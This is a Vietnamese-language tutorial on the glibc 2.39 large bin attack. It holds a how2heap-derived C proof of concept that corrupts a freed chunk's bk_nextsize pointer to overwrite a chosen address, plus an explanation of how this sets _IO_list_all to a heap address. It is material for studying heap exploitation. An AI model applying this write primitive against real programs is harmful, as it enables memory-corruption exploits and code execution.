<details>
<summary> <strong> Description </strong></summary>
<p>

Kĩ thuật này được sử dụng để gán `_IO_list_all` thành một địa chỉ trên heap.

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

Kĩ thuật này được chạy trên glibc `2.39`.

```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

A revisit to large bin attack for after glibc2.30

Relevant code snippet :

	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}


*/

int main(){
  /*Disable IO buffering to prevent stream from interfering with heap*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  printf("\n\n");
  printf("Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n");
  printf("Check 1 : \n");
  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  printf("Check 2 : \n");
  printf(">    if (bck->fd != fwd)\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  printf("This prevents the traditional large bin attack\n");
  printf("However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n");
  
  printf("====================================================================\n\n");

  size_t target = 0;
  printf("Here is the target we want to overwrite (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("First, we allocate a large chunk [p1] (%p)\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("And another chunk to prevent consolidate\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("We also allocate a second large chunk [p2]  (%p).\n",p2-2);
  printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
  size_t *g2 = malloc(0x18);
  printf("Once again, allocate a guard chunk to prevent consolidate\n");

  printf("\n");

  free(p1);
  printf("Free the larger of the two --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");

  printf("\n");

  free(p2);
  printf("Free the smaller of the two --> [p2] (%p)\n",p2-2);
  printf("At this point, we have one chunk in large bin [p1] (%p),\n",p1-2);
  printf("               and one chunk in unsorted bin [p2] (%p)\n",p2-2);

  printf("\n");

  p1[3] = (size_t)((&target)-4);
  printf("Now modify the p1->bk_nextsize to [target-0x20] (%p)\n",(&target)-4);

  printf("\n");

  size_t *g4 = malloc(0x438);
  printf("Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n", p2-2, p2-2);
  printf("Since glibc does not check chunk->bk_nextsize if the new inserted chunk is smaller than smallest,\n");
  printf("  the modified p1->bk_nextsize does not trigger any error\n");
  printf("Upon inserting [p2] (%p) into largebin, [p1](%p)->bk_nextsize->fd_nextsize is overwritten to address of [p2] (%p)\n", p2-2, p1-2, p2-2);

  printf("\n");

  printf("In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n", p2-2, (void *)target);
  printf("Target (%p) : %p\n",&target,(size_t*)target);

  printf("\n");
  printf("====================================================================\n\n");

  assert((size_t)(p2-2) == target);

  return 0;
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>


Đầu tiên, đây là struct của `malloc_chunk`:
```c
struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk fd;                /* double links -- used only if this chunk is free. */
  struct malloc_chunk bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk fd_nextsize; /* double links -- used only if this chunk is free. */
  struct malloc_chunk bk_nextsize;
};
```

![](./pics/image1.png)

- <code>victim</code> là chunk hiện tại đang muốn nhét vào largebin 
- <code>bck</code> ban đầu là <code>main_arena</code>
- <code>fwd</code> ban đầu là chunk đầu tiên trong largebin index được lấy ra


Tôi sẽ thay head chunk trong largebin đc lấy ra là `p1` và `victim` thành `p2` để cho giống với trong `POC`.

Ta thấy được là largebin ở index đó không rỗng và `p2` cũng có size bé hơn `p1` nên nó sẽ chạy vào dòng [4183](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4183).

Ở đây ta thấy:
- `p2->fd_nextsize` = `p1` 
- `p2->bk_nextsize` = `p1->bk_nextsize` 
- `p1->bk_nextsize->fd_nextsize` = `p2` 
- `p1->bk_nextsize` = `p2`

Vậy nên ta sẽ gán được `_IO_list_all` thành `p2 - 0x10`

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/shellphish/how2heap/blob/master/glibc_2.39/large_bin_attack.c
- https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L4070

</p>
</details>